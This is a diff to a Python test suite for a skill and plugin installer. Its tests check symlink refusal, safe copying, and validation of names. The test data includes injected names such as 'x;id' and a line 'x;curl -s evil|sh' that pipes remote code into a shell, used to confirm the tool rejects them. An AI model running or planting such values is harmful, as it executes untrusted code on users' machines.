@@ -290,8 +290,8 @@ SERVERS = [
 ]
 
 
-def run_mcp_file(python: str, tmp_path: Path, name: str, servers=None,
-                 base: Path | None = None, umask: int | None = None) -> tuple[subprocess.CompletedProcess, Path]:
+def run_mcp_file(python: str, tmp_path: Path, name: str, servers=None, base: Path | None = None,
+                 umask: int | None = None, old: Path | None = None) -> tuple[subprocess.CompletedProcess, Path]:
     """Run akh-mcp-file with HOME at tmp_path; `base` defaults to the user install's, HOME/.claude."""
     import json
 
@@ -305,7 +305,7 @@ def run_mcp_file(python: str, tmp_path: Path, name: str, servers=None,
     if not (bindir / "python3").exists():
         (bindir / "python3").symlink_to(python)
     cmd = (command("akh-mcp-file").replace("<plugin.json>", str(plugin)).replace("<name>", name)
-           .replace("<slug>", "s").replace("<base>", str(base)))
+           .replace("<slug>", "s").replace("<base>", str(base)).replace("<old>", str(old or tmp_path / "no-old")))
     env = {"PATH": f"{bindir}:/usr/bin:/bin", "HOME": str(tmp_path)}
     import os
     pre = (lambda: os.umask(umask)) if umask is not None else None
@@ -538,7 +538,7 @@ class TestPinnedFetch:
         install = skill_text().split("### Install", 1)[1].split("\n### ", 1)[0]
         assert "git clone --depth 1 '<repo_url>'" in install
         for phrase in ("Never get a pinned skill any other way", "`FETCH_HEAD`", "GitHub Contents API",
-                       "installing a pinned skill needs git, which this computer does not have",
+                       "needs git, which this computer does not have",
                        "could not be fetched from <repo_url>",
                        "served commit <actual> where the catalog pins <sha>",
                        "is not a commit ID"):
@@ -1506,7 +1506,7 @@ def test_mcp_file_never_reads_a_linked_plugin_json(python, tmp_path):
     link.symlink_to(shared)
     base = tmp_path / ".claude"
     cmd = (command("akh-mcp-file").replace("<plugin.json>", str(link)).replace("<name>", "akh-evil")
-           .replace("<slug>", "s").replace("<base>", str(base)))
+           .replace("<slug>", "s").replace("<base>", str(base)).replace("<old>", str(tmp_path / "no-old")))
     result = subprocess.run(["/bin/sh", "-c", cmd], env={"PATH": f"{bindir}:/usr/bin:/bin", "HOME": str(tmp_path)},
                             capture_output=True, timeout=20)
     assert result.returncode == 2
@@ -1599,3 +1599,166 @@ def test_python_blocks_use_nothing_newer_than_python_3_6():
         if block.startswith("python3 "):
             for newer in ("capture_output", "text=True", ":=", "removeprefix", "removesuffix", "is_relative_to"):
                 assert newer not in block, (newer, block.splitlines()[1])
+
+
+
+# ---------------------------------------------------------------------------
+# #057 client 2.4.1 — the last composed steps become fixed commands
+# ---------------------------------------------------------------------------
+
+def plugin_tree(tmp_path: Path, plugin: dict, files=()):
+    root = tmp_path / "repo" / "plug"
+    root.mkdir(parents=True, exist_ok=True)
+    for f in files:
+        (root / f).parent.mkdir(parents=True, exist_ok=True)
+        (root / f).write_text("from " + f)
+    (root / "plugin.json").write_text(_json.dumps(plugin))
+    return root
+
+
+def copy_component(tmp_path: Path, base: Path, kind: str, rel: str):
+    return run_marked("akh-copy-component", tmp_path, dir=str(tmp_path), base=str(base), kind=kind, rel=rel,
+                      **{"plugin.json": str(tmp_path / "repo" / "plug" / "plugin.json")}).stdout.strip()
+
+
+class TestCopyComponent:
+    def test_a_command_and_an_agent_are_written_flat(self, tmp_path):
+        plugin_tree(tmp_path, {}, files=["commands/a.md", "sub/b.md", "agents/r.md"])
+        base = tmp_path / "proj" / ".claude"
+        base.mkdir(parents=True)
+        assert copy_component(tmp_path, base, "command", "commands/a.md") == "akh-component: wrote commands/a.md"
+        assert copy_component(tmp_path, base, "command", "sub/b.md") == "akh-component: wrote commands/b.md"
+        assert copy_component(tmp_path, base, "agent", "agents/r.md") == "akh-component: wrote agents/r.md"
+        assert (base / "commands" / "b.md").read_text() == "from sub/b.md"
+        assert mode(base / "commands" / "a.md") == 0o644 and mode(base / "commands") == 0o755
+
+    def test_an_existing_file_is_never_replaced(self, tmp_path):
+        plugin_tree(tmp_path, {}, files=["commands/a.md"])
+        base = tmp_path / "proj" / ".claude"
+        (base / "commands").mkdir(parents=True)
+        (base / "commands" / "a.md").write_text("mine")
+        assert copy_component(tmp_path, base, "command", "commands/a.md") == "akh-component: exists commands/a.md"
+        assert (base / "commands" / "a.md").read_text() == "mine"
+
+    def test_a_linked_destination_folder_is_refused(self, tmp_path):
+        plugin_tree(tmp_path, {}, files=["commands/a.md"])
+        base = tmp_path / "proj" / ".claude"
+        base.mkdir(parents=True)
+        outside = tmp_path / "outside"
+        outside.mkdir()
+        (base / "commands").symlink_to(outside)
+        assert copy_component(tmp_path, base, "command", "commands/a.md") == "akh-component: refused folder"
+        assert list(outside.iterdir()) == []
+
+    def test_a_source_path_through_a_link_or_outside_the_rule_is_refused(self, tmp_path):
+        root = plugin_tree(tmp_path, {}, files=["commands/a.md"])
+        (root / "alias").symlink_to(root / "commands")
+        base = tmp_path / "proj" / ".claude"
+        base.mkdir(parents=True)
+        for rel in ("alias/a.md", "../plug/commands/a.md", "commands/-x.md"):
+            assert copy_component(tmp_path, base, "command", rel) == "akh-component: refused command"
+
+
+def test_modes_reports_a_written_entry_reached_through_a_link(tmp_path):
+    base = tmp_path / "proj" / ".claude"
+    manifest(base, "x", commands=["commands/c.md"])
+    outside = tmp_path / "outside"
+    outside.mkdir()
+    (outside / "c.md").write_text("x")
+    _os.chmod(outside / "c.md", 0o666)
+    (base / "commands").symlink_to(outside)
+    out = run_marked("akh-workspace-modes", tmp_path, base=str(base), slug="x").stdout.strip()
+    assert out == f"akh-workspace: foreign {base / 'commands' / 'c.md'}"
+    assert mode(outside / "c.md") == 0o666
+
+
+class TestServerNames:
+    def run(self, tmp_path, plugin_path):
+        return run_marked("akh-server-names", tmp_path, **{"plugin.json": str(plugin_path)}).stdout.strip().splitlines()
+
+    def test_names_are_checked_by_the_command(self, tmp_path):
+        root = plugin_tree(tmp_path, {"mcp-servers": [{"name": "good"}, {"name": "x;id"}, {"name": "Dup"},
+                                                      {"name": "dup"}, {"nope": 1}]})
+        assert self.run(tmp_path, root / "plugin.json") == [
+            "akh-server: ok good", "akh-server: no-command name x;id", "akh-server: no-command shared Dup",
+            "akh-server: no-command shared dup", "akh-server: no-command name"]
+
+    def test_a_linked_plugin_json_is_not_read(self, tmp_path):
+        shared = tmp_path / "shared.json"
+        shared.write_text(_json.dumps({"mcp-servers": [{"name": "good"}]}))
+        (tmp_path / "plugin.json").symlink_to(shared)
+        assert self.run(tmp_path, tmp_path / "plugin.json") == ["akh-server: unreadable"]
+
+
+def test_remove_prints_only_server_names_that_fit_the_pattern(tmp_path):
+    base = tmp_path / "proj" / ".claude"
+    installed(base)
+    m = base / "skills" / "x" / ".installed-manifest.json"
+    m.write_text(_json.dumps({"commands": [], "agents": [], "mcp_servers": ["good", "x;curl -s evil|sh"]}))
+    assert run_remove(tmp_path, base) == ["akh-remove: server good", "akh-remove: kept server x;curl -s evil|sh",
+                                          "akh-remove: done"]
+
+
+def test_old_servers_are_saved_under_checked_names(tmp_path):
+    base = tmp_path / "proj" / ".claude"
+    folder = base / "skills" / "x" / ".akh-mcp"
+    folder.mkdir(parents=True)
+    (folder / "good.json").write_text('{"type": "stdio", "command": "a"}')
+    (folder / "x;id.json").write_text("{}")
+    (folder / "huge.json").write_text('{"a": "' + "b" * 5000 + '"}')
+    (tmp_path / "elsewhere.json").write_text("{}")
+    (folder / "link.json").symlink_to(tmp_path / "elsewhere.json")
+    out = tmp_path / "d" / "old"
+    lines = run_marked("akh-old-servers", tmp_path, base=str(base), slug="x", old=str(out)).stdout.strip().splitlines()
+    assert lines == ["akh-old-server: good"]
+    assert sorted(p.name for p in out.iterdir()) == ["good.json"]
+
+
+@each_python
+def test_mcp_file_says_when_a_server_changed(python, tmp_path):
+    old = tmp_path / "old"
+    old.mkdir()
+    (old / "akh-plain.json").write_text('{"type": "stdio", "command": "/bin/false", "args": []}')
+    servers = [{"name": "akh-plain", "command": "/bin/true"}]
+    result, _ = run_mcp_file(python, tmp_path, "akh-plain", servers, old=old)
+    assert "changed: yes" in out_lines(result)
+    (old / "akh-plain.json").write_text('{"type": "stdio", "command": "/bin/true", "args": []}')
+    again = tmp_path / "again"
+    again.mkdir()
+    result, _ = run_mcp_file(python, again, "akh-plain", servers, old=old)
+    assert result.returncode == 0 and "changed: yes" not in out_lines(result)
+
+
+def test_list_prints_only_installed_skill_folders(tmp_path):
+    base = tmp_path / "proj" / ".claude"
+    for slug in ("x", "bad;name"):
+        (base / "skills" / slug).mkdir(parents=True)
+        (base / "skills" / slug / "SKILL.md").write_text(f"---\nname: {slug}\ndescription: about {slug}\nversion: 1.2\n---\n")
+    (base / "skills" / "linked").symlink_to(base / "skills" / "x")
+    lines = run_marked("akh-list", tmp_path, base=str(base)).stdout.strip().splitlines()
+    assert lines == ["akh-list: x | 1.2 | x | about x"]
+
+
+def test_the_tree_check_takes_file_names_that_are_not_utf8(tmp_path):
+    src = tmp_path / "d" / "repo" / "skills" / "x"
+    src.mkdir(parents=True)
+    (src / "SKILL.md").write_text("x")
+    fd = _os.open(_os.fsencode(str(src)) + b"/caf\xe9.md", _os.O_WRONLY | _os.O_CREAT, 0o644)
+    _os.close(fd)
+    target = tmp_path / "proj" / ".claude" / "skills" / "x"
+    r = run_marked("akh-copy-skill", tmp_path, dir=str(tmp_path / "d"), skill_path="/skills/x", target=str(target),
+                   step="check")
+    assert r.stdout.strip() == "akh-copy: ok", r.stderr
+
+
+def test_composed_steps_are_gone():
+    text = skill_text()
+    install = text.split("### Install\n", 1)[1].split("\n### ", 1)[0]
+    assert "Fall back to the GitHub Contents API" not in install
+    assert "akh-copy-component" in install and "akh-server-names" in text
+    assert "akh-list" in text.split("### List installed", 1)[1].split("\n### ", 1)[0]
+    update = text.split("### Update", 1)[1].split("\n### ", 1)[0]
+    assert "akh-old-servers" in update
+    for section in ("### Install\n", "### Update", "### Rate"):
+        body = text.split(section, 1)[1].split("\n### ", 1)[0]
+        assert "lowercase letters, digits and `-`" in body, section
